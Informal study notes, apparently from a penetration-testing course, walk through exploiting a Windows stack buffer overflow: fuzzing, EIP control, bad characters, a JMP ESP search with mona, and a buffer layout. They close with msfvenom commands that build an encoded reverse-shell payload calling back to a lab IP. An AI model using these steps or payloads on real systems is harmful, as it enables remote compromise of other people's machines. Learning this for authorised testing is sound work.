Main ways of identifying flaws in applications:

1. If source code is available , then source code review 
2. If application is close sourced, then reverse engineering
3. Fuzzing to find bugs

**Fuzzing :**

Fuzzing involves sending malformed data into application input and watching for  
 unexpected crashes.

An unexpected crash indicates that the application might not filter certain input correctly. This could lead to discovering an exploitable vulnerability

buffer = A\*2606 + &lt;Bufffer Overflow / EIP Address&gt; + shell code + "C" \* \(3500 -2606 -4 -351\)

**Steps:**

1. **Fuzzing and crash replication**
   1. Create a fuzzing script and find the exact location whr the crash occurs.\(Attach process 2 debugger & enable the putty\)
   2. Once debugger is attached pauses the process , press the play button to allow debugger to release the process and run normally
   3. run the fuzzer prog , at one point debugger pauses and allow use to analyze
   4. F2 to set the breakpoint
   5. Recreate the crash with the modified script and run it
   6. find the register values \( ESP and EIP\) after the pause of debugger
2. **Controlling the EIP** \(controls execution flow of the prog\)
   1. Locate the EIP position in our buffer
   2. Ruby Pattern creator tool - to create the unique buffer strings
   3. we could figure out unique four bytes in our buffer
   4. pattern-offset : gives position of the four unique bytes
   5. Now we replace the value with the user controlled bytes 
   6. Control the execution flow of the application , by changing the specific \(EIP\) Bytes
3. **ShellCode **\(User entered code\)
   1. once the shellcode is in memory we can redirect the execution of the application to this shell code
   2. we need to increase the size of the buffer in order to accommodate the shellcode \(3500\)
   3. ESP would be the best address to insert the shellcode , as it is easy to access the address
   4. Shellcode payload generator : 
4. **Bad Character**

   1. certain character are considered bad , should not be used in the buffer , return address, shellcode  ex: NOP, \r etc

   2. add all combinations of HEX character combinations to buffer

   3. Buffer = A + B + bad characters

   4. run and check whether any issue wt

5. **Redirecting Execution flow** :

   1. we found the location for our shellcode in the memory location tht is easily accessible by ESP Register

   2. we Control the EIP Register

   3. We figured wht characters are allowed in the buffer

   4. Now to redirect the execution to shellcode at the time of the crash

   5. to get tht we need to get the address of the ESP instead of B's to EIP.

   6. We need to find more generic way to find the ESP Address at the time of crash

   7. Application at run time loads certain libraries , dlls , drivers etc we can look at those to find instruction like \( Jmp ESP \)

6. **Mona \( third party debugger \)**

   1. !mona modules

   2. choose module : no Memory protection \(DEP, ASLR\) , no bad characters

   3. nasm\_shell script -- prints the opcode of any instruction

   4. mona module can search for any opcode in given memory range

   5. !mona find -s "\xff\xe4" -m slmfc.dll   --- &gt; given address has this instruction

   6. now we can use this address to make EIP point to ESP at runtime

   7. modify in skeleton exploit , replace B's with the obtained address and set the breakpoint \(F2\) in debugger also run regular by F7

7. **Shellcode payload generator**

   1. msfvenom -p windows/shell_reverse\_tcp LHOST=10.11.0.196 LPORT=443 -f c -a x86 --platform windows _
   2. lot of bad characters in the shellcode so we need to encode.
   3. add the bad character list to no allow 
   4. msfvenom -p windows/shell_reverse_\_tcp  LHOST=10.11.0.196 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d"  -e x86/shikata ga nai 
   5. bad character not sent over the wire 



